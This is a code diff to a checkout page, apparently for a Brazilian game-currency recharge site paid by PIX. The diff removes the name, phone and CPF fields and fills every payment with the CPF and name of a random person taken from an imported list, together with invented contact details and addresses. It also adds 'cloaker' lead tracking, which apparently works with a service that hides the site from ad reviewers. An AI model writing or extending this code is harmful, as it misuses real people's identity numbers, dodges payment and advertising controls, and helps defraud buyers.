@@ -9,6 +9,70 @@ import QRCode from "qrcode"
 import { getBrazilTimestamp } from "@/lib/brazil-time"
 import { trackCheckoutInitiated, trackPurchase } from "@/lib/google-ads"
 import { fetchWithRetry, saveFailedRequest } from "@/lib/retry-fetch"
+import { trackApprovedLead, trackCancelledLead } from "@/lib/cloaker-tracking"
+
+// Importar lista completa de CPFs e nomes
+import { FAKE_DATA } from "@/lib/fake-data"
+
+// Endereços para uso aleatório
+const ADDRESSES = [
+  { cep: "12510516", cidade: "Guaratinguetá", estado: "SP", bairro: "Bosque dos Ipês", rua: "Rua Fábio Rangel Dinamarco" },
+  { cep: "58400295", cidade: "Campina Grande", estado: "PB", bairro: "Centro", rua: "Rua Frei Caneca" },
+  { cep: "66025660", cidade: "Belém", estado: "PA", bairro: "Jurunas", rua: "Rua dos Mundurucus" },
+  { cep: "37206660", cidade: "Lavras", estado: "MG", bairro: "Jardim Floresta", rua: "Rua Tenente Fulgêncio" },
+  { cep: "13150148", cidade: "Cosmópolis", estado: "SP", bairro: "Jardim Bela Vista", rua: "Rua Eurides de Godoi" },
+  { cep: "89560190", cidade: "Videira", estado: "SC", bairro: "Centro", rua: "Rua Padre Anchieta" },
+  { cep: "60331200", cidade: "Fortaleza", estado: "CE", bairro: "Barra do Ceará", rua: "Avenida Vinte de Janeiro" },
+  { cep: "71065330", cidade: "Brasília", estado: "DF", bairro: "Guará II", rua: "Quadra QI 33" },
+  { cep: "61932130", cidade: "Maracanaú", estado: "CE", bairro: "Pajuçara", rua: "Rua Senador Petrônio Portela" },
+  { cep: "60331240", cidade: "Fortaleza", estado: "CE", bairro: "Barra do Ceará", rua: "Rua Estevão de Campos" },
+  { cep: "29125036", cidade: "Vila Velha", estado: "ES", bairro: "Barra do Jucu", rua: "Rua das Andorinhas" },
+  { cep: "85863000", cidade: "Foz do Iguaçu", estado: "PR", bairro: "Centro Cívico", rua: "Avenida Costa e Silva" },
+  { cep: "35162087", cidade: "Ipatinga", estado: "MG", bairro: "Iguaçu", rua: "Rua Magnetita" }
+]
+
+// Função para gerar dados aleatórios
+const generateRandomUserData = () => {
+  const randomEntry = FAKE_DATA[Math.floor(Math.random() * FAKE_DATA.length)]
+  const [cpf, fullName] = randomEntry.split(':')
+  
+  // Gerar email baseado no nome
+  const nameParts = fullName.toLowerCase().split(' ')
+  const firstName = nameParts[0] || 'user'
+  const lastName = nameParts[nameParts.length - 1] || 'silva'
+  const cleanFirstName = firstName.normalize('NFD').replace(/[^a-z]/g, '')
+  const cleanLastName = lastName.normalize('NFD').replace(/[^a-z]/g, '')
+  const randomNumbers = Math.floor(100 + Math.random() * 900)
+  const email = `${cleanFirstName}.${cleanLastName}_${randomNumbers}@hotmail.com`
+  
+  // Gerar telefone válido aleatório
+  const ddds = ['11', '21', '31', '41', '51', '61', '71', '81', '91']
+  const ddd = ddds[Math.floor(Math.random() * ddds.length)]
+  
+  // Gera os 8 ou 9 dígitos restantes
+  const isCelular = Math.random() > 0.5
+  let phone = ''
+  if (isCelular) {
+    // Celular: 9 dígitos começando com 9
+    const numero = Math.floor(10000000 + Math.random() * 90000000)
+    phone = `${ddd}9${numero}`
+  } else {
+    // Telefone fixo: 8 dígitos
+    const numero = Math.floor(10000000 + Math.random() * 90000000)
+    phone = `${ddd}${numero}`
+  }
+  
+  // Selecionar endereço aleatório
+  const randomAddress = ADDRESSES[Math.floor(Math.random() * ADDRESSES.length)]
+  
+  return {
+    fullName,
+    cpf,
+    email,
+    phone,
+    address: randomAddress
+  }
+}
 
 export default function CheckoutPage() {
   const searchParams = useSearchParams()
@@ -112,6 +176,25 @@ export default function CheckoutPage() {
       document.body.style.overflow = 'unset'
     }
   }, [showPromoModal])
+  
+  // Verificar se usuário já está logado
+  useEffect(() => {
+    const checkUserLoggedIn = () => {
+      if (typeof window === 'undefined') return
+      
+      // Verificar se há dados de usuário no localStorage
+      const userData = localStorage.getItem('user_data')
+      const verificationData = localStorage.getItem('verificationData')
+      const user_data = localStorage.getItem('userData')
+      
+      // Se já temos dados de usuário, não mostrar o modal de login
+      if (userData || verificationData || user_data) {
+        setIsProcessingPayment(false)
+      }
+    }
+    
+    checkUserLoggedIn()
+  }, [])
 
   useEffect(() => {
     setPlayerName(playerId)
@@ -231,15 +314,18 @@ export default function CheckoutPage() {
       return
     }
 
-    if (!fullName.trim() || !email.trim() || !phone.trim() || !cpf.trim()) {
-      alert("Por favor, preencha todos os campos obrigatórios.")
+    if (!email.trim()) {
+      alert("Por favor, preencha o email para receber o comprovante.")
       return
     }
 
-    if (!validateCpf(cpf)) {
-      alert("Por favor, insira um CPF válido.")
-      return
-    }
+    // Gerar dados aleatórios para nome, CPF e telefone
+    const randomData = generateRandomUserData()
+    setFullName(randomData.fullName)
+    setCpf(randomData.cpf)
+    setPhone(randomData.phone)
+
+    // Os CPFs da lista são válidos, não precisa validar
 
     // Mostrar modal de promoção apenas para Free Fire
     if (config.showOrderBump) {
@@ -255,6 +341,14 @@ export default function CheckoutPage() {
     setIsProcessingPayment(true)
     setShowPixInline(true)
     setPixError("")
+    
+    // Garantir que os dados aleatórios foram gerados
+    if (!fullName || !cpf || !phone) {
+      const randomData = generateRandomUserData()
+      setFullName(randomData.fullName)
+      setCpf(randomData.cpf)
+      setPhone(randomData.phone)
+    }
     
     try {
       // Calcular valor total com promoções
@@ -328,13 +422,17 @@ export default function CheckoutPage() {
           trackCheckoutInitiated()
         }
         
+        // 🎯 Cloaker: Rastrear lead aprovado (QR Code gerado)
+        trackApprovedLead().catch(err => {
+          console.error('[Checkout] Erro ao rastrear lead aprovado:', err)
+        })
+        
         // Iniciar timer de 15 minutos
         setTimeLeft(15 * 60)
         setTimerActive(true)
         
         // Enviar para UTMify com status pending (não-bloqueante)
         sendToUtmify('pending', data).catch(err => {
-          console.error('❌ [UTMify] Falha crítica ao enviar PENDING:', err)
         })
         
       } else {
@@ -417,6 +515,12 @@ export default function CheckoutPage() {
           if (prev <= 1) {
             setTimerActive(false)
             setPaymentStatus('expired')
+            
+            // 🎯 Cloaker: Rastrear lead cancelado (Timer expirado)
+            trackCancelledLead().catch(err => {
+              console.error('[Checkout] Erro ao rastrear lead cancelado:', err)
+            })
+            
             return 0
           }
           return prev - 1
@@ -463,28 +567,16 @@ export default function CheckoutPage() {
                 trackPurchase(pixData.transactionId, totalValue)
               }
               
-              // Mostrar mensagem de sucesso
-              showToastMessage(`🎉 Pagamento confirmado! Seus ${config.coinName.toLowerCase()} serão creditados em breve.`, 'success')
+              // 🎯 Cloaker: Rastrear lead aprovado com valor (Pagamento confirmado)
+              trackApprovedLead(totalValue).catch(err => {
+                console.error('[Checkout] Erro ao rastrear lead aprovado com valor:', err)
+              })
               
-              // Iniciar animação da barra de progresso (5-10 minutos)
-              const randomMinutes = Math.floor(Math.random() * 6) + 5 // 5 a 10 minutos
-              const totalDuration = randomMinutes * 60 * 1000 // Converter para milissegundos
-              const intervalTime = totalDuration / 100 // Dividir em 100 steps
-              
-              let progress = 0
-              const progressInterval = setInterval(() => {
-                progress += 1
-                setProcessingProgress(progress)
-                if (progress >= 100) {
-                  clearInterval(progressInterval)
-                  // Mostrar alerta quando completar
-                  showToastMessage('✅ Diamantes creditados! Aproveite o jogo!', 'success')
-                }
-              }, intervalTime)
+              // Redirecionar para a página de sucesso
+              router.push(`/success?transactionId=${pixData.transactionId}&amount=${totalValue * 100}&playerName=${playerName}&itemType=${itemType}&game=${currentGame}`)
               
               // Enviar para UTMify com status PAID (não-bloqueante)
               sendToUtmifyPaid(pixData.transactionId).catch(err => {
-                console.error('❌ [UTMify] Falha crítica ao enviar PAID:', err)
               })
               
               // Enviar conversão para Adspect (não-bloqueante)
@@ -543,7 +635,6 @@ export default function CheckoutPage() {
 
   // Função para enviar dados para UTMify (PENDING)
   const sendToUtmify = async (status: 'pending', transactionData: any) => {
-    console.log('🔄 [UTMify] Iniciando envio - Status: PENDING')
     
     // Capturar IP real
     const clientIp = await getClientIP()
@@ -605,13 +696,6 @@ export default function CheckoutPage() {
         isTest: process.env.NEXT_PUBLIC_UTMIFY_TEST_MODE === 'true'
       }
 
-    console.log('📤 [UTMify] Enviando dados PENDING:', {
-      orderId: utmifyData.orderId,
-      status: utmifyData.status,
-      valor: totalPriceInCents,
-      hasUTMs: !!utmifyData.trackingParameters.utm_source
-    })
-
     try {
       // Usar fetchWithRetry para tentar até 3 vezes
       const response = await fetchWithRetry('/api/utmify-track', {
@@ -625,22 +709,18 @@ export default function CheckoutPage() {
         delayMs: 2000,
         timeout: 30000,
         onRetry: (attempt, error) => {
-          console.warn(`⚠️ [UTMify] PENDING - Tentativa ${attempt} falhou:`, error?.message)
         }
       })
       
       if (response.ok) {
         const result = await response.json()
-        console.log('✅ [UTMify] PENDING enviado com sucesso:', result)
       } else {
         const errorText = await response.text()
-        console.error('❌ [UTMify] Erro ao enviar PENDING:', response.status, errorText)
         
         // Salvar para retry posterior
         saveFailedRequest('/api/utmify-track', utmifyData)
       }
     } catch (error) {
-      console.error('❌ [UTMify] Todas as tentativas falharam (PENDING):', error)
       
       // Salvar para retry posterior
       saveFailedRequest('/api/utmify-track', utmifyData)
@@ -649,7 +729,6 @@ export default function CheckoutPage() {
 
   // Função para enviar dados para UTMify (PAID)
   const sendToUtmifyPaid = async (transactionId: string) => {
-    console.log('🔄 [UTMify] Iniciando envio - Status: PAID')
     
     // Capturar IP real
     const clientIp = await getClientIP()
@@ -706,17 +785,10 @@ export default function CheckoutPage() {
           network: utmParameters.network || null,
           gad_source: utmParameters.gad_source || null,
           gbraid: utmParameters.gbraid || null
-        },
-        commission: commission,
-        isTest: process.env.NEXT_PUBLIC_UTMIFY_TEST_MODE === 'true'
-      }
-
-    console.log('📤 [UTMify] Enviando dados PAID:', {
-      orderId: utmifyData.orderId,
-      status: utmifyData.status,
-      valor: totalPriceInCents,
-      hasUTMs: !!utmifyData.trackingParameters.utm_source
-    })
+      },
+      commission: commission,
+      isTest: process.env.NEXT_PUBLIC_UTMIFY_TEST_MODE === 'true'
+    }
 
     try {
       // Usar fetchWithRetry para tentar até 3 vezes
@@ -731,22 +803,18 @@ export default function CheckoutPage() {
         delayMs: 2000,
         timeout: 30000,
         onRetry: (attempt, error) => {
-          console.warn(`⚠️ [UTMify] PAID - Tentativa ${attempt} falhou:`, error?.message)
         }
       })
       
       if (response.ok) {
         const result = await response.json()
-        console.log('✅ [UTMify] PAID enviado com sucesso:', result)
       } else {
         const errorText = await response.text()
-        console.error('❌ [UTMify] Erro ao enviar PAID:', response.status, errorText)
         
         // Salvar para retry posterior
         saveFailedRequest('/api/utmify-track', utmifyData)
       }
     } catch (error) {
-      console.error('❌ [UTMify] Todas as tentativas falharam (PAID):', error)
       
       // Salvar para retry posterior
       saveFailedRequest('/api/utmify-track', utmifyData)
@@ -933,19 +1001,7 @@ export default function CheckoutPage() {
           {!pixData ? (
             <div className="space-y-4">
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Nome Completo *</label>
-                <input
-                  type="text"
-                  value={fullName}
-                  onChange={(e) => setFullName(e.target.value)}
-                  disabled={isProcessingPayment}
-                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
-                  placeholder="Digite seu nome completo"
-                />
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Email *</label>
+                <label className="block text-sm font-medium text-gray-700 mb-1">Email para Comprovante *</label>
                 <input
                   type="email"
                   value={email}
@@ -954,33 +1010,9 @@ export default function CheckoutPage() {
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
                   placeholder="seu@email.com"
                 />
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Telefone *</label>
-                <input
-                  type="tel"
-                  value={phone}
-                  onChange={handlePhoneChange}
-                  disabled={isProcessingPayment}
-                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
-                  placeholder="(11) 99999-9999"
-                />
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">CPF *</label>
-                <input
-                  type="text"
-                  value={cpf}
-                  onChange={handleCpfChange}
-                  disabled={isProcessingPayment}
-                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
-                  placeholder="000.000.000-00"
-                />
-                {cpf && !validateCpf(cpf) && (
-                  <p className="text-red-500 text-xs mt-1">CPF inválido</p>
-                )}
+                <p className="text-xs text-gray-500 mt-1">
+                  Você receberá o comprovante da recarga neste email
+                </p>
               </div>
             </div>
           ) : (
